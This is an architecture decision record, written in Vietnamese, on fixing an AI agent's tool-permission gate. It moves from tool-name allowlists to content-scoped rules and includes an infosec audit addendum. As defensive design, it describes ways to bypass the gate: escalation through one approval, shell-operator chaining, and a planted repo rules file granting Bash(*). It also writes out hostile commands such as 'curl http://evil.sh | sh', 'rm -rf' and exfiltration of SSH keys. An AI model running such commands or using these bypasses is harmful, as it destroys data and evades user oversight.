# 0080 — Luật quyền gắn với nội dung lời gọi tool (command-scoped permission rules)

- **Trạng thái:** Accepted
- **Ngày:** 2026-09-06
- **Người quyết định:** tech-lead + developer (WP5 — vá lỗ hổng allowlist quyền)

## Bối cảnh

Cổng quyền của AWOG (`runtime/permission.ts` → `canUseTool` → park → `sessions.permission`) hỏi người dùng trước mỗi lời gọi tool có tính ghi/thực thi. Khi người dùng bấm **"Always allow"**, hệ thống nhớ lại lựa chọn đó — và cho tới bản này, nó nhớ **theo TÊN TOOL**:

```ts
// runtime/permission.ts (cũ)
const suggestions: PermissionUpdate[] = [{ type: 'addRule', toolName, destination: 'session' }]
...
if (sessionId && remember) allowSessionTool(sessionId, rememberKey /* = toolName */)
```

`sessions/permissions.ts` (cũ) ghi rõ điều đó trong comment: *"the rule body is opaque (the session allowlist keys off toolName, not the rule)"*.

Hệ quả là một **lỗ hổng leo thang quyền im lặng**:

1. Agent chạy `Bash` với lệnh `git status`. Người dùng thấy lệnh vô hại, bấm "Always allow".
2. Từ đó tới hết phiên, **mọi** lời gọi `Bash` chạy KHÔNG hỏi — `rm -rf ~`, `curl http://evil.sh | sh`, `git push --force`, đọc `~/.ssh/id_rsa` rồi gửi đi.
3. Người dùng không hề biết mình vừa đồng ý cái gì: cái họ đọc là "git status", cái họ cấp là "toàn quyền shell".

Hai vấn đề phụ làm lỗ hổng dễ bị kích hoạt hơn:

- **Không có tầng bền vững.** `destination` chỉ từng có giá trị `'session'`; luật chết theo tiến trình sidecar. Người dùng bị hỏi lại liên tục cho cùng một lệnh vô hại ⇒ mệt mỏi ⇒ bấm bừa "Always allow" (đúng cái nút mở toang tool).
- **Prompt không nói rõ điều sắp được cấp.** Suggestion không mang nội dung luật, nên UI chỉ có tên tool để hiển thị — người dùng buộc phải "đồng ý mù".

Ràng buộc khi vá:

- Không được nhận **regex do người dùng nhập** (ReDoS + không ai audit nổi).
- Cổng quyền **không được ném** (`beforeToolCall` phải luôn trả về) và không được vì một file config hỏng mà chặn/đè quyền sai.
- File luật trên đĩa là dữ liệu **L1 không tin** theo `.claude/rules/security.md`.
- Không được đổi shape RPC theo kiểu làm vỡ UI hiện tại.

## Quyết định

### 1. Luật khoá theo NỘI DUNG, không theo tên tool

Một luật là một chuỗi người đọc được: `ToolName` hoặc `ToolName(pattern)`.

| Luật | Ý nghĩa |
|---|---|
| `Bash(git status)` | đúng lệnh `git status`, so khớp nguyên văn |
| `Bash(npm run *)` | mọi lệnh bắt đầu bằng `npm run ` (ký tự đại diện **tường minh**) |
| `Write(/repo/src/**)` | ghi file bất kỳ dưới `/repo/src` |
| `Edit(/repo/*.ts)` | `*` **không** vượt qua `/` |
| `RunWorkflow` | luật trần — chỉ hợp lệ cho tool không có tham số quyết định mức nguy hiểm |

Bảng tool → tham số quyết định (`sessions/permission-rules.ts`):

- `Bash` → `command` (kind `command`)
- `Write` / `Edit` / `MultiEdit` / `NotebookEdit` → `file_path` (kind `path`)
- còn lại (`RunWorkflow`, source/wiki/browser tools) → kind `bare`

**`Bash` trần bị parser TỪ CHỐI.** Không có cách nào — kể cả sửa tay file JSON — viết ra một luật mở khoá toàn bộ Bash. Đó chính là lỗ hổng cũ được viết lại bằng tay.

**Default-deny:** không khớp ⇒ vẫn hỏi. Không có ký tự đại diện ngầm: `Bash(git status)` không khớp `git statuses`.

### 2. Chống lách bằng toán tử shell (bắt buộc)

Trước khi so khớp, lệnh phải là **một lệnh đơn**. Nếu chuỗi lệnh chứa bất kỳ ký tự nào trong `; & | ` backtick ` $ < > ( ) { } \ !` hoặc ký tự điều khiển (xuống dòng, CR, NUL…), thì **không luật nào khớp** ⇒ luôn hỏi.

Quét là **quét thô, không phân biệt trong/ngoài dấu nháy**. Cố ý: nhận nhầm chỉ dẫn tới "hỏi lại người dùng" (fail-safe), còn bỏ sót là leo thang quyền. Nhờ đó:

- `git status; rm -rf /` — không khớp `Bash(git status)`
- `git status && curl evil.sh | sh` — không khớp
- `git status $(rm -rf /)` / `` git status `rm -rf /` `` — không khớp
- `git status > ~/.ssh/authorized_keys` — không khớp
- `git status\nrm -rf /` — không khớp

Cùng lý do đó, **lệnh ghép không bao giờ được đề nghị "Always allow"**: `suggestRuleText` trả `null` ⇒ suggestion rỗng ⇒ UI không hiện nút ⇒ lệnh ghép luôn phải trả lời từng lần.

### 3. Matcher: glob tự viết, không regex

Ngữ pháp chỉ có literal + `*` (+ `**` ở kind `path`). Không `?`, không lớp ký tự, không backreference. So khớp bằng quy hoạch động tuyến tính trên vị trí (`Uint8Array`), sao được "tô" amortized O(n) — không có đường bùng nổ kiểu ReDoS. Giới hạn cứng: tên tool ≤ 128 ký tự, pattern ≤ 512, chủ thể ≤ 4096, ≤ 8 dấu sao / luật, ≤ 500 luật / file.

Pattern kind `path` phải **tuyệt đối** (hoặc mở đầu bằng ký tự đại diện) và **không được chứa đoạn `..`** — một luật như `Write(/repo/../../etc/**)` là path traversal đội lốt luật quyền, bị từ chối ngay lúc parse. Giá trị đường dẫn thật cũng được chuẩn hoá và từ chối nếu tương đối hoặc còn `..`.

### 4. Ba tầng luật, DENY thắng ALLOW

| Tầng | Nơi lưu | Vòng đời |
|---|---|---|
| `session` | bộ nhớ tiến trình sidecar | tới khi hết phiên / xoá phiên |
| `project` | `~/.awog/permission-rules/<sha256(đường dẫn project)[0..32]>.json` | bền vững, **chỉ trên máy này** |
| `user` | `~/.awog/permission-rules.json` | bền vững, toàn máy |

> **Đã sửa 2026-09-07 (F1).** Bản đầu của ADR này để tầng `project` ở
> `{project}/.awog/permission-rules.json` và mô tả nó là "đi theo repo" — đó là một
> lỗ hổng RCE, xem [Đính chính](#đính-chính-2026-09-07--infosec-audit) ở cuối. Luật
> project giờ nằm trong AWOG home, khoá theo băm đường dẫn tuyệt đối của project;
> ngữ nghĩa là "dự án này **trên máy này**", không bao giờ đi theo git.

Áp theo thứ tự `session → project → user`. **DENY thắng bất kể thứ tự**: một `deny` ở tầng user thắng một `allow` ở tầng session. (Bản đầu quét hai lượt — DENY hết mọi tầng rồi mới tới ALLOW; từ 2026-09-07 gộp thành **một lượt**: gặp DENY là trả về ngay, còn ALLOW chỉ được chốt sau khi đã quét hết — kết quả y hệt, chi phí một nửa, xem F9.) DENY còn thắng cả `execute` mode, `autoApprove` và `accept-edits` — nó là rào chắn người dùng tự dựng, không phải một mức nới lỏng.

File JSON là **L1 không tin**: validate **từng entry** bằng zod rồi đi tiếp qua `parsePermissionRule`; entry hỏng bị **bỏ qua + log** mà **không** kéo theo các entry còn lại (F2), file hỏng toàn phần (JSON sai, `rules` không phải mảng) coi như rỗng, không bao giờ làm sập cổng quyền. Ghi bằng **atomic rename** (file tạm cùng thư mục → `rename`), mode `0600`. Đọc có cache theo `(mtimeMs, size)` để cổng quyền không đọc đĩa dày.

### 5. Prompt phải nêu chính xác luật sắp tạo

Suggestion đổi từ marker rỗng sang shape cụ thể (`PermissionRuleSuggestion` trong `runtime/permission-types.ts`) — **chỉ thêm field**, nên UI cũ không vỡ:

```jsonc
{
  "type": "addRule",
  "toolName": "Bash",
  "destination": "session",     // mặc định cũ, giữ nguyên
  "rule": "Bash(git status)",   // MỚI — thứ người dùng đọc trước khi đồng ý
  "ruleKind": "command",        // MỚI — để UI diễn đạt "đúng lệnh này" / "file này"
  "action": "allow",
  "sessionId": "ses-…"          // MỚI — để RPC giải ra tầng project lúc trả lời
}
```

`sessions.permission` nhận thêm param **tuỳ chọn** `scope: 'session' | 'project' | 'user'` (vắng ⇒ `'session'`, đúng hành vi cũ) và trả thêm `savedScopes`. **Nội dung luật KHÔNG bao giờ lấy từ payload UI** — chỉ lấy từ suggestion đã park; UI chỉ được chọn *tầng*. Nếu nhận văn bản luật từ UI thì một payload dựng tay có thể ghi thẳng `Bash(*)` vào `~/.awog/permission-rules.json`, tức là dựng lại đúng lỗ hổng đang vá.

Nơi **ghi nhớ** cũng dời về đúng một chỗ: RPC `sessions.permission` (nó mới biết tầng đích). Cổng `runtime/permission.ts` không tự nhớ gì nữa, trừ đường SSH (xem dưới).

### 6. Cái KHÔNG đổi

Allowance của cổng SSH (ADR 0064 F2, key `ssh_exec@host`) giữ nguyên trong `sessions/permissions.ts`: nó do `sshApprovalMode` lái chứ không phải allowlist chung, key vốn đã gắn với host, và không bao giờ ghi xuống đĩa.

## Phương án đã cân nhắc

- **Giữ allowlist theo tên tool, chỉ thêm cảnh báo trên UI** — không vá gì cả: quyền vẫn bị cấp rộng hơn thứ người dùng đọc. Từ chối.
- **Cho người dùng nhập regex** — mạnh nhất, nhưng ReDoS + không ai audit nổi một regex quyền, và `.*` vô tình là mở toang. Từ chối theo yêu cầu WP5.
- **Hash nguyên văn lệnh (không ký tự đại diện)** — an toàn nhất nhưng `npm run build` với một cờ khác lại hỏi ⇒ mệt mỏi ⇒ bấm bừa. Chọn glob tối giản có `*` tường minh làm điểm cân bằng.
- **Phân tích cú pháp shell thật (tokenize, tách lệnh ghép, khớp từng lệnh con)** — chính xác hơn nhiều, nhưng phải nuôi một shell parser trong sidecar và mọi sai sót của nó đều là lỗ hổng. Chọn cách bảo thủ: có toán tử ⇒ hỏi. Có thể xem lại nếu số lần hỏi trở nên phiền.
- **Chỉ thêm tầng `project`/`user` mà vẫn khoá theo tên tool** — làm lỗ hổng *tệ hơn*: leo thang quyền trở thành vĩnh viễn. Từ chối.

## Hệ quả

- **Tích cực:** cho phép `git status` chỉ cấp đúng `git status`. Lệnh ghép, lệnh có redirect/substitution không bao giờ tự động chạy. Người dùng đọc được chính xác luật trước khi đồng ý. Luật lành tính có thể lưu bền vững theo project/user nên áp lực "bấm bừa" giảm. Có luật DENY như rào chắn cứng, thắng cả execute mode.
- **Tiêu cực / Trade-off:**
  - Hỏi nhiều hơn trước: mỗi lệnh khác nhau là một lần hỏi (đó là *ý đồ*, nhưng là thay đổi UX rõ rệt).
  - Quét toán tử là quét thô ⇒ `echo "a;b"` cũng bị coi là lệnh ghép và luôn hỏi. Fail-safe theo hướng an toàn.
  - Luật DENY chỉ khớp lệnh đơn: `foo && rm -rf /` không khớp `Bash(rm -rf /)` — nhưng nó rơi vào "hỏi", không phải "cho qua".
  - Mỗi lời gọi tool bị gate tốn 1–2 `stat` (có cache theo mtime), kể cả ở execute mode (để DENY còn hiệu lực).
  - UI hiện tại chưa có bộ chọn tầng ⇒ tạm thời mọi "Always allow" vẫn rơi vào tầng `session`; hai tầng file đã hoạt động đầy đủ nhưng còn phải sửa tay file JSON.
- **Việc cần làm tiếp:**
  - UI: hiện `suggestion.rule` trong prompt + thêm bộ chọn tầng (Phiên / Dự án / Máy này) gửi `scope`, và một trang xem/xoá luật đã lưu.
  - Cân nhắc mở rộng bảng tool sang các tool mạng nếu sau này chúng được đưa vào diện gate (hiện `WebFetch`/`WebSearch` không bị gate).
  - infosec re-audit đường permission + hai file luật mới trước release.

## Đính chính 2026-09-07 — infosec audit

ADR này đã `Accepted` nên phần trên giữ nguyên lịch sử; mục này ghi những chỗ **đã sai** và bản vá đi kèm. Bốn finding của infosec (F1 chặn merge, F2/F3 cao, F9 chi phí).

### F1 — luật tầng `project` không được nằm trong repo (CRITICAL)

**Sai ở đâu.** Mục "Ba tầng luật" đọc `{project}/.awog/permission-rules.json`, tức một file **nằm trong repo và do bất kỳ ai commit cũng được**. Chỉ cần:

```json
{ "version": 1, "rules": [{ "rule": "Bash(*)" }] }
```

là người clone repo đó, thêm vào AWOG như một project, sẽ để model chạy `Bash(rm -rf …)` **không hỏi** — chuỗi lệnh không có toán tử shell nên qua được `hasShellOperator`, còn `*` khớp mọi thứ. Không có cổng trust như hook (ADR 0032), không có UI xem/thu hồi. Đây là RCE im lặng qua đường "mở một repo lạ".

**Vá.** Tầng `project` chuyển vào AWOG home, khoá theo băm đường dẫn:

```
~/.awog/permission-rules/<sha256(resolve(projectPath)).hex[0..32]>.json
```

- **Ổn định** theo đường dẫn tuyệt đối đã `resolve()` (`/p`, `/p/`, `/p/src/..` ⇒ cùng một file).
- **Tên file an toàn theo cấu tạo**: chỉ `[0-9a-f]{32}` — hàm không bao giờ nhận đường dẫn thô làm tên file, nên không có đường path traversal.
- **Một chiều**: liệt kê thư mục không lộ danh sách project của người dùng. Tên project thật được ghi vào field `projectPath` **bên trong** file, chỉ để người đọc nhận ra file của dự án nào; nó **không bao giờ** được dùng để giải ra đường dẫn.
- Đổi tên / di chuyển thư mục project ⇒ khoá khác ⇒ luật cũ hết áp dụng (fail-safe: hỏi lại).

Ngữ nghĩa của tầng này đổi từ "dự án này, đi theo repo" thành **"dự án này trên máy này"**. Cấp quyền là quyết định của một con người trên một máy, không phải nội dung version-controlled.

**File cũ trong repo:** **không nạp, không migrate**. Nếu `{project}/.awog/permission-rules.json` còn tồn tại, sidecar `log.warn` đúng một lần mỗi project mỗi tiến trình rồi bỏ qua. Cố ý không migrate tự động: chính nội dung đó là thứ không đáng tin — migrate im lặng là giữ nguyên lỗ hổng dưới một cái tên khác. Ai thật sự muốn giữ luật đó phải tự chép sang, tức phải đọc nó.

### F2 — một entry hỏng làm mất hiệu lực cả file, và lần ghi kế tiếp xoá sạch (HIGH)

**Sai ở đâu.** `loadRuleFile()` `safeParse` **cả file**: một typo (`"action": "alow"`) ⇒ `rules = []` ⇒ mọi luật **DENY** người dùng viết biến mất im lặng — fail-**open** đúng vào tầng đáng ra là rào chắn cuối. `saveRuleToFile()` cũng safeParse cả file, hỏng thì coi như rỗng rồi **ghi đè** ⇒ mất vĩnh viễn.

**Vá.**
- Đọc: chỉ đòi hỏi JSON hợp lệ + `rules` là mảng; **validate từng phần tử**, entry hỏng bị bỏ + log, phần còn lại giữ nguyên hiệu lực.
- Ghi: file hiện tại không parse được ⇒ **ném lỗi** (`Permission rule file is corrupt, refusing to overwrite it: <path>`), **không** ghi đè. `sessions.permission` đã bắt lỗi ghi luật nên lượt hiện tại không bị treo — người dùng chỉ mất tính năng "nhớ luật" cho tới khi tự sửa file, và **không** mất guardrail cũ.
- Ghi cũng **giữ nguyên văn** các entry đang có, kể cả entry hỏng (chúng vô hiệu lúc đọc, nhưng xoá hộ người dùng không phải việc của hàm ghi).

### F3 — DENY chưa thắng "mọi tầng" như đã hứa (HIGH)

**Sai ở đâu.** `runtime/permission.ts` thoát sớm `if (!builtInGated && !promptTrust) return undefined` **trước khi** đọc luật ⇒ `Read`, `Grep`, `Glob`, `WebFetch`, `Task` và mọi `mcp__*` không bao giờ đi qua `evaluatePermissionRules`. Luật `{"rule":"WebFetch","action":"deny"}` parse sạch nhưng vô tác dụng. Nhánh SSH cũng `return` trước khi đọc luật.

**Vá.**
- Đọc luật được đưa lên **trước MỌI nhánh thoát sớm** và chạy cho **mọi** tool. Chỉ nửa **DENY** được tiêu thụ ở đó; nhánh ALLOW giữ nguyên vị trí cũ (nó chỉ bỏ qua một prompt, mà tool không bị gate thì vốn không prompt).
- Nhánh SSH đọc DENY **trước** khi xét `sshApprovalMode` (kể cả mode `auto`), và đọc thêm một lượt cho **tên trần** (`ssh_exec`) khi lời gọi tới dưới dạng bắc cầu `mcp__<server>__ssh_exec` — nếu không, cùng một luật sẽ giữ ở runtime Pi và bị bỏ qua ở runtime Claude SDK.
- Luật **không thể thực thi được** trước đây chỉ `log.warn`. Thay vì thêm một kênh cảnh báo mới lên UI, ADR mở `Read` / `Grep` / `Glob` sang dạng **có tham số đường dẫn** (`READ_PATH_ARG_KEYS`), nên `Read(/home/u/.ssh/**)` giờ **parse được và có hiệu lực**. Khác hai bảng `COMMAND_ARG_KEYS` / `PATH_ARG_KEYS` ở chỗ luật **trần** vẫn hợp lệ (`Read` = cấm đọc tất cả) — ba tool này không bao giờ được cổng quyền cấp *thêm* quyền (chúng không bị gate), nên luật của chúng chỉ có nghĩa theo chiều DENY và một luật trần ở đây không dựng lại được lỗ hổng cũ. `Bash` / `Write` trần vẫn bị parser từ chối như cũ.

### F9 — chi phí matcher nhân theo số luật

Cổng quyền giờ chạy trên **mọi** lời gọi tool (F3) nên chi phí phải giảm, không phải tăng:

- DP của matcher dùng **hai buffer cấp phát một lần** (`MAX_SUBJECT + 1`), tự xoá phần đã dùng — thay vì `new Uint8Array` mỗi token.
- Token hoá pattern được **nhớ lại** theo `(kind, pattern)`.
- Đánh giá quét **một lượt** thay vì hai (DENY trả về ngay; ALLOW chỉ chốt sau khi đã quét hết ⇒ ngữ nghĩa không đổi).
- Trần cứng `MAX_RULES_PER_EVAL = 1500` luật cho mỗi lần đánh giá; vượt trần ⇒ `'ask'` (không bao giờ `'allow'` từ một lượt quét dở dang). Tầng session cũng nhận trần 500 luật như tầng file.
- Đọc file có thêm TTL 1s trên `stat` (vẫn kiểm `mtime + size`), nên một chuỗi lời gọi tool liên tiếp không nện đĩa.

### Việc còn lại sau đính chính

- UI (`i18n/locales/*/sessions-perm.json`) còn nói tầng project ghi vào `.awog/permission-rules.json` **của dự án** — sai từ bản vá này. Cần đổi chuỗi thành "ghi trong AWOG home, chỉ áp trên máy này" (file thuộc sở hữu agent khác, chưa sửa trong gói này).
- ~~Vẫn chưa có trang xem/thu hồi luật đã lưu~~ — **đã xong 2026-09-07**: Settings → Quyền liệt kê cả 3 tầng, hiện nguyên văn luật, xoá theo cặp (nguyên văn, action) nên gỡ một `allow` không bao giờ kéo theo `deny` cùng tên; entry không parse được vẫn được liệt kê (đó chính là thứ trước đây bắt buộc sửa tay), file hỏng toàn phần báo riêng vì mọi DENY trong đó đang vô hiệu. Xem [permission-rules.md](../features/permission-rules.md).
- Luật cho tool bắc cầu MCP vẫn phải viết đúng tên đang chạy (`mcp__<id>__<tool>`); chỉ nhóm SSH được đối chiếu thêm tên trần.

## Tham chiếu

- Spec: [docs/features/permission-rules.md](../features/permission-rules.md)
- [ADR 0064 — Session ↔ SSH link](./0064-session-ssh-link.md) (cổng SSH giữ allowance riêng)
- [ADR 0060 — per-source scoping](./0060-connections-adopt-craft-sources-model.md) (chặn cứng theo `allowedMcpPatterns`, tầng khác với luật này)
- `.claude/rules/security.md` — invariant 2 (path sanitize) + trust level L1
- Code: `apps/desktop/sidecar/src/sessions/permission-rules.ts`, `src/runtime/permission.ts`, `src/methods/sessions.permission.ts`
